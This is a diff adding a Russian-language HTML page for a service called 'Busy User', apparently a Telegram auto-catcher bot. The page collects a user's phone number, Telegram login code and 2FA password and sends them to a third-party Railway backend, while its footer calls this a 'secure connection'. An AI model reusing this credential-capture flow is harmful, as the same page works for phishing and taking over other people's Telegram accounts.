@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Busy User — Подключение аккаунта</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0a0a0c;
+    --surface: #111116;
+    --surface2: #18181f;
+    --border: rgba(255,255,255,0.07);
+    --border-active: rgba(99,102,241,0.6);
+    --accent: #6366f1;
+    --accent2: #818cf8;
+    --text: #f1f1f3;
+    --muted: #6b6b7a;
+    --success: #22d3a5;
+    --error: #f87171;
+    --glow: rgba(99,102,241,0.15);
+  }
+
+  html, body {
+    height: 100%;
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Syne', sans-serif;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  body {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 24px 16px;
+    position: relative;
+    overflow-x: hidden;
+  }
+
+  /* ── Ambient background ── */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background:
+      radial-gradient(ellipse 80% 50% at 20% -10%, rgba(99,102,241,0.12) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 40% at 80% 110%, rgba(129,140,248,0.08) 0%, transparent 60%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  /* Noise texture */
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.03'/%3E%3C/svg%3E");
+    pointer-events: none;
+    z-index: 0;
+    opacity: 0.4;
+  }
+
+  .wrap {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+  }
+
+  /* ── Logo / Brand ── */
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 36px;
+    animation: fadeUp 0.5s ease both;
+  }
+
+  .brand-icon {
+    width: 38px;
+    height: 38px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    box-shadow: 0 0 20px var(--glow);
+    flex-shrink: 0;
+  }
+
+  .brand-name {
+    font-size: 17px;
+    font-weight: 700;
+    letter-spacing: -0.3px;
+    color: var(--text);
+  }
+
+  .brand-sub {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    color: var(--muted);
+    letter-spacing: 0.5px;
+    margin-top: 1px;
+  }
+
+  /* ── Card ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 20px;
+    padding: 28px 24px;
+    position: relative;
+    overflow: hidden;
+    animation: fadeUp 0.5s 0.08s ease both;
+  }
+
+  .card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(99,102,241,0.4), transparent);
+  }
+
+  .card-title {
+    font-size: 22px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    line-height: 1.2;
+    margin-bottom: 8px;
+  }
+
+  .card-desc {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.6;
+    margin-bottom: 28px;
+    font-weight: 400;
+  }
+
+  /* ── Steps indicator ── */
+  .steps {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 24px;
+  }
+
+  .step-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--border);
+    transition: all 0.3s ease;
+    flex-shrink: 0;
+  }
+
+  .step-dot.active {
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+    width: 20px;
+    border-radius: 3px;
+  }
+
+  .step-dot.done {
+    background: var(--success);
+  }
+
+  /* ── Form ── */
+  .field {
+    margin-bottom: 16px;
+  }
+
+  .field-label {
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: 0.8px;
+    text-transform: uppercase;
+    color: var(--muted);
+    margin-bottom: 8px;
+    display: block;
+  }
+
+  .field-input {
+    width: 100%;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 15px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    -webkit-appearance: none;
+  }
+
+  .field-input::placeholder {
+    color: var(--muted);
+    font-size: 14px;
+  }
+
+  .field-input:focus {
+    border-color: var(--border-active);
+    box-shadow: 0 0 0 3px rgba(99,102,241,0.1);
+  }
+
+  .field-input.error {
+    border-color: rgba(248,113,113,0.5);
+    box-shadow: 0 0 0 3px rgba(248,113,113,0.08);
+  }
+
+  .field-hint {
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 6px;
+    line-height: 1.5;
+  }
+
+  /* Code input special */
+  .code-wrap {
+    display: flex;
+    gap: 8px;
+  }
+
+  .code-input {
+    flex: 1;
+    text-align: center;
+    font-size: 22px;
+    letter-spacing: 6px;
+    padding: 16px;
+    font-weight: 500;
+  }
+
+  /* ── Button ── */
+  .btn {
+    width: 100%;
+    padding: 15px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border: none;
+    border-radius: 12px;
+    color: #fff;
+    font-family: 'Syne', sans-serif;
+    font-size: 15px;
+    font-weight: 700;
+    letter-spacing: -0.2px;
+    cursor: pointer;
+    transition: opacity 0.2s, transform 0.15s, box-shadow 0.2s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 20px;
+    box-shadow: 0 4px 24px rgba(99,102,241,0.3);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .btn::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(rgba(255,255,255,0.1), transparent);
+    pointer-events: none;
+  }
+
+  .btn:hover { opacity: 0.9; transform: translateY(-1px); box-shadow: 0 8px 32px rgba(99,102,241,0.4); }
+  .btn:active { transform: translateY(0); }
+  .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+
+  .btn-ghost {
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--muted);
+    box-shadow: none;
+    margin-top: 10px;
+    font-weight: 500;
+  }
+
+  .btn-ghost:hover { border-color: rgba(255,255,255,0.15); color: var(--text); box-shadow: none; }
+
+  /* ── Spinner ── */
+  .spinner {
+    width: 16px; height: 16px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+
+  /* ── Alert ── */
+  .alert {
+    display: none;
+    align-items: flex-start;
+    gap: 10px;
+    padding: 12px 14px;
+    border-radius: 10px;
+    font-size: 13px;
+    line-height: 1.5;
+    margin-top: 14px;
+    font-weight: 400;
+  }
+
+  .alert.show { display: flex; }
+
+  .alert-error {
+    background: rgba(248,113,113,0.08);
+    border: 1px solid rgba(248,113,113,0.2);
+    color: var(--error);
+  }
+
+  .alert-info {
+    background: rgba(99,102,241,0.08);
+    border: 1px solid rgba(99,102,241,0.2);
+    color: var(--accent2);
+  }
+
+  .alert-icon { font-size: 15px; flex-shrink: 0; margin-top: 1px; }
+
+  /* ── Success Screen ── */
+  .success-screen {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    padding: 12px 0;
+  }
+
+  .success-screen.show { display: flex; }
+
+  .success-icon {
+    width: 72px; height: 72px;
+    background: rgba(34,211,165,0.1);
+    border: 1px solid rgba(34,211,165,0.25);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    margin-bottom: 20px;
+    animation: pop 0.4s cubic-bezier(0.175,0.885,0.32,1.275) both;
+  }
+
+  .success-title {
+    font-size: 20px;
+    font-weight: 800;
+    letter-spacing: -0.4px;
+    margin-bottom: 8px;
+    color: var(--success);
+  }
+
+  .success-desc {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.6;
+    max-width: 280px;
+  }
+
+  .success-phone {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    padding: 6px 14px;
+    border-radius: 8px;
+    margin: 14px 0;
+    color: var(--text);
+  }
+
+  /* ── Resources ── */
+  .resources {
+    display: flex;
+    gap: 8px;
+    margin-top: 16px;
+  }
+
+  .res-btn {
+    flex: 1;
+    padding: 10px;
+    background: var(--surface2);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    color: var(--muted);
+    font-family: 'Syne', sans-serif;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    transition: border-color 0.2s, color 0.2s;
+  }
+
+  .res-btn:hover { border-color: rgba(255,255,255,0.15); color: var(--text); }
+
+  /* ── Footer ── */
+  .footer {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 12px;
+    color: var(--muted);
+    animation: fadeUp 0.5s 0.15s ease both;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* ── Page views ── */
+  .page { display: none; }
+  .page.active { display: block; }
+
+  /* ── Divider ── */
+  .divider {
+    height: 1px;
+    background: var(--border);
+    margin: 20px 0;
+  }
+
+  /* ── Animations ── */
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(16px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  @keyframes pop {
+    from { transform: scale(0.5); opacity: 0; }
+    to   { transform: scale(1); opacity: 1; }
+  }
+
+  @keyframes shake {
+    0%,100% { transform: translateX(0); }
+    20%,60% { transform: translateX(-5px); }
+    40%,80% { transform: translateX(5px); }
+  }
+
+  .shake { animation: shake 0.35s ease; }
+
+  /* Mobile */
+  @media (max-width: 440px) {
+    .card { padding: 24px 20px; border-radius: 18px; }
+    .card-title { font-size: 20px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="brand">
+    <div class="brand-icon">🤖</div>
+    <div>
+      <div class="brand-name">Busy User</div>
+      <div class="brand-sub">Busy User System</div>
+    </div>
+  </div>
+
+  <div class="card">
+
+    <!-- Steps -->
+    <div class="steps" id="steps">
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+      <div class="step-dot" id="dot3"></div>
+    </div>
+
+    <!-- PAGE 1: Phone -->
+    <div class="page active" id="page-phone">
+      <div class="card-title">Добавление аккаунта</div>
+      <div class="card-desc">Чтобы подключить ловушку, нужно войти в ваш Telegram аккаунт.</div>
+
+      <div class="field">
+        <label class="field-label" for="phone">Номер телефона</label>
+        <input class="field-input" id="phone" type="tel" placeholder="+7 900 123 45 67" autocomplete="tel" inputmode="tel">
+        <div class="field-hint">Код может прийти в Telegram, по SMS или на Fragment — зависит от аккаунта.</div>
+      </div>
+
+      <div class="alert alert-error" id="phone-error">
+        <span class="alert-icon">⚠️</span>
+        <span id="phone-error-text">Введите корректный номер телефона.</span>
+      </div>
+
+      <button class="btn" id="btn-send-code" onclick="sendCode()">
+        <span class="spinner" id="spinner1"></span>
+        <span id="btn-send-text">→ Отправить код</span>
+      </button>
+
+      <div class="divider"></div>
+      <div class="resources">
+        <a href="https://t.me/+cLn3vs9bbyBkN2Uy" target="_blank" class="res-btn">❓ Чат для вопросов</a>
+        <a href="https://t.me/FrostyCas" target="_blank" class="res-btn">📢 Новостной канал</a>
+      </div>
+    </div>
+
+    <!-- PAGE 2: Code -->
+    <div class="page" id="page-code">
+      <div class="card-title">Введите код</div>
+      <div class="card-desc" id="code-desc">Мы отправили код подтверждения на ваш аккаунт.</div>
+
+      <div class="field">
+        <label class="field-label">Код из Telegram</label>
+        <input class="field-input code-input" id="code" type="text" placeholder="· · · · ·" maxlength="7" autocomplete="one-time-code" inputmode="numeric" oninput="handleCodeInput(this)">
+        <div class="field-hint" id="code-hint">Введите код из приложения Telegram или SMS.</div>
+      </div>
+
+      <div class="alert alert-error" id="code-error">
+        <span class="alert-icon">⚠️</span>
+        <span id="code-error-text">Неверный код. Попробуйте ещё раз.</span>
+      </div>
+
+      <div class="alert alert-info" id="code-info" style="display:none">
+        <span class="alert-icon">🔐</span>
+        <span>Аккаунт защищён двухфакторной аутентификацией. Введите пароль ниже.</span>
+      </div>
+
+      <div class="field" id="field-2fa" style="display:none; margin-top:12px;">
+        <label class="field-label">Пароль 2FA</label>
+        <input class="field-input" id="password2fa" type="password" placeholder="Ваш облачный пароль">
+      </div>
+
+      <button class="btn" id="btn-verify" onclick="verifyCode()">
+        <span class="spinner" id="spinner2"></span>
+        <span id="btn-verify-text">✓ Подтвердить</span>
+      </button>
+
+      <button class="btn btn-ghost" onclick="goBack()">‹ Изменить номер</button>
+    </div>
+
+    <!-- PAGE 3: Success -->
+    <div class="page" id="page-success">
+      <div class="success-screen show">
+        <div class="success-icon">✓</div>
+        <div class="success-title">Аккаунт подключён!</div>
+        <div class="success-phone" id="success-phone">+7 900 ...</div>
+        <div class="success-desc">Ваш аккаунт успешно добавлен в систему Busy User. Теперь автоловец активен.</div>
+      </div>
+
+      <div class="divider"></div>
+      <div class="resources">
+        <a href="https://t.me/busyuser_bot" target="_blank" class="res-btn">🤖 Открыть бота</a>
+        <a href="https://t.me/FrostyCas" target="_blank" class="res-btn">📢 Канал</a>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="footer">
+    Безопасное подключение · Busy User
+  </div>
+</div>
+
+<script>
+  // ── Config ──────────────────────────────────────────────────
+  // Замените на URL вашего бэкенда
+  const API_BASE = 'https://web-production-24a24.up.railway.app';
+  const BOT_USERNAME = 'busyuser_bot';
+
+  let currentPhone = '';
+  let sessionId = '';
+
+  // ── Helpers ─────────────────────────────────────────────────
+  function setPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+
+    const dots = ['dot1','dot2','dot3'];
+    const pages = ['page-phone','page-code','page-success'];
+    const idx = pages.indexOf(id);
+    dots.forEach((d, i) => {
+      const el = document.getElementById(d);
+      el.classList.remove('active','done');
+      if (i < idx) el.classList.add('done');
+      if (i === idx) el.classList.add('active');
+    });
+  }
+
+  function setLoading(btnId, spinnerId, loading) {
+    const btn = document.getElementById(btnId);
+    const sp = document.getElementById(spinnerId);
+    btn.disabled = loading;
+    sp.style.display = loading ? 'block' : 'none';
+  }
+
+  function showError(id, textId, msg) {
+    const el = document.getElementById(id);
+    el.classList.add('show');
+    el.classList.remove('alert-info');
+    el.classList.add('alert-error');
+    document.getElementById(textId).textContent = msg;
+    el.parentElement.classList.add('shake');
+    setTimeout(() => el.parentElement.classList.remove('shake'), 400);
+  }
+
+  function hideError(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+
+  function handleCodeInput(el) {
+    // Убираем всё кроме цифр и дефисов
+    el.value = el.value.replace(/[^0-9\-]/g, '');
+    hideError('code-error');
+  }
+
+  // ── Phone formatting ─────────────────────────────────────────
+  const phoneEl = document.getElementById('phone');
+  phoneEl.addEventListener('keypress', e => {
+    if (e.key === 'Enter') sendCode();
+  });
+
+  phoneEl.addEventListener('input', () => {
+    hideError('phone-error');
+  });
+
+  // ── Step 1: Send code ────────────────────────────────────────
+  async function sendCode() {
+    hideError('phone-error');
+    const phone = phoneEl.value.trim().replace(/\s/g, '');
+    if (!phone || phone.length < 7) {
+      showError('phone-error', 'phone-error-text', 'Введите корректный номер телефона.');
+      return;
+    }
+
+    currentPhone = phone;
+    setLoading('btn-send-code','spinner1', true);
+    document.getElementById('btn-send-text').textContent = 'Отправка...';
+
+    try {
+      const res = await fetch(API_BASE + '/send_code', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ phone })
+      });
+      const data = await res.json();
+
+      if (!res.ok || !data.ok) {
+        throw new Error(data.error || 'Ошибка при отправке кода.');
+      }
+
+      sessionId = data.session_id || '';
+      document.getElementById('code-desc').textContent =
+        'Код отправлен на ' + phone + '. Проверьте Telegram или SMS.';
+      setPage('page-code');
+      setTimeout(() => document.getElementById('code').focus(), 100);
+
+    } catch (e) {
+      showError('phone-error', 'phone-error-text', e.message);
+    } finally {
+      setLoading('btn-send-code','spinner1', false);
+      document.getElementById('btn-send-text').textContent = '→ Отправить код';
+    }
+  }
+
+  // ── Step 2: Verify code ──────────────────────────────────────
+  async function verifyCode() {
+    hideError('code-error');
+    const code = document.getElementById('code').value.trim().replace(/\D/g,'');
+    const password = document.getElementById('password2fa').value;
+
+    if (!code || code.length < 5) {
+      showError('code-error','code-error-text','Введите код из Telegram (5 цифр).');
+      return;
+    }
+
+    setLoading('btn-verify','spinner2', true);
+    document.getElementById('btn-verify-text').textContent = 'Проверяем...';
+
+    try {
+      const body = { phone: currentPhone, code, session_id: sessionId };
+      if (password) body.password = password;
+
+      const res = await fetch(API_BASE + '/verify_code', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(body)
+      });
+      const data = await res.json();
+
+      if (!res.ok || !data.ok) {
+        // 2FA required
+        if (data.need_password) {
+          document.getElementById('code-info').style.display = 'flex';
+          document.getElementById('field-2fa').style.display = 'block';
+          document.getElementById('btn-verify-text').textContent = '✓ Войти с паролем';
+          return;
+        }
+        throw new Error(data.error || 'Неверный код.');
+      }
+
+      // Success
+      document.getElementById('success-phone').textContent = currentPhone;
+      setPage('page-success');
+
+    } catch (e) {
+      showError('code-error','code-error-text', e.message);
+    } finally {
+      setLoading('btn-verify','spinner2', false);
+      if (document.getElementById('btn-verify-text').textContent !== '✓ Войти с паролем') {
+        document.getElementById('btn-verify-text').textContent = '✓ Подтвердить';
+      }
+    }
+  }
+
+  // ── Go back ──────────────────────────────────────────────────
+  function goBack() {
+    document.getElementById('code').value = '';
+    document.getElementById('password2fa').value = '';
+    document.getElementById('code-info').style.display = 'none';
+    document.getElementById('field-2fa').style.display = 'none';
+    hideError('code-error');
+    setPage('page-phone');
+  }
+
+  // Enter on code field
+  document.getElementById('code').addEventListener('keypress', e => {
+    if (e.key === 'Enter') verifyCode();
+  });
+  document.getElementById('password2fa').addEventListener('keypress', e => {
+    if (e.key === 'Enter') verifyCode();
+  });
+</script>
+</body>
+</html>
